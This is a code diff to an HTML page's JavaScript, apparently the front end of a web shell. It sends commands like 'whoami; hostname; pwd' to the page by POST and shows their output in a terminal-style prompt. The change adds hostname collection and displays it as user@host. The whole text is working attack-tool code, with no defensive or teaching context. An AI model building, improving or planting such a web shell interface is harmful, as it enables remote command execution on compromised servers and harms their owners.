@@ -102,6 +102,7 @@
         </div>
         <script type="text/javascript">
             var username = "";
+            var hostname = "";
             var currentDir = "";
             getShellInfo();
             
@@ -112,15 +113,16 @@
                     if (request.readyState == XMLHttpRequest.DONE) {
                         var parsedResponse = request.responseText.replace(/(?:\r\n|\r|\n)/g, ",").split(",");
                         username = parsedResponse[0];
-                        currentDir =  parsedResponse[1];
+                        hostname = parsedResponse[1];
+                        currentDir =  parsedResponse[2];
                         
-                        document.getElementById("username").innerHTML = "<div style='color: #ff0000; display: inline;'>"+username+"</div>:"+currentDir+"#";
+                        document.getElementById("username").innerHTML = "<div style='color: #ff0000; display: inline;'>"+username+"@"+hostname+"</div>:"+currentDir+"#";
                     }
                 };
 
                 request.open("POST", "", true);
                 request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-                request.send("cmd=whoami; pwd");
+                request.send("cmd=whoami; hostname; pwd");
             }
                         
             function sendCommand() {
@@ -149,10 +151,10 @@
                         if (cd) {
                             var parsedResponse = request.responseText.replace(/(?:\r\n|\r|\n)/g, ",").split(",");
                             currentDir = parsedResponse[parsedResponse.length-2];
-                            outputElement.innerHTML += "<div style='color:#ff0000; float: left;'>"+username+"</div><div style='float: left;'>"+":"+originalDir+"# "+originalCommand+"</div><br>";
+                            outputElement.innerHTML += "<div style='color:#ff0000; float: left;'>"+username+"@"+hostname+"</div><div style='float: left;'>"+":"+originalDir+"# "+originalCommand+"</div><br>";
                             document.getElementById("username").innerHTML = "<div style='color: #ff0000; display: inline;'>"+username+"</div>:"+currentDir+"#";
                         } else {
-                            outputElement.innerHTML += "<div style='color:#ff0000; float: left;'>"+username+"</div><div style='float: left;'>"+":"+currentDir+"# "+originalCommand+"</div><br>" + request.responseText.replace(/(?:\r\n|\r|\n)/g, "<br>");
+                            outputElement.innerHTML += "<div style='color:#ff0000; float: left;'>"+username+"@"+hostname+"</div><div style='float: left;'>"+":"+currentDir+"# "+originalCommand+"</div><br>" + request.responseText.replace(/(?:\r\n|\r|\n)/g, "<br>");
                             outputElement.scrollTop = outputElement.scrollHeight;
                         } 
                     }
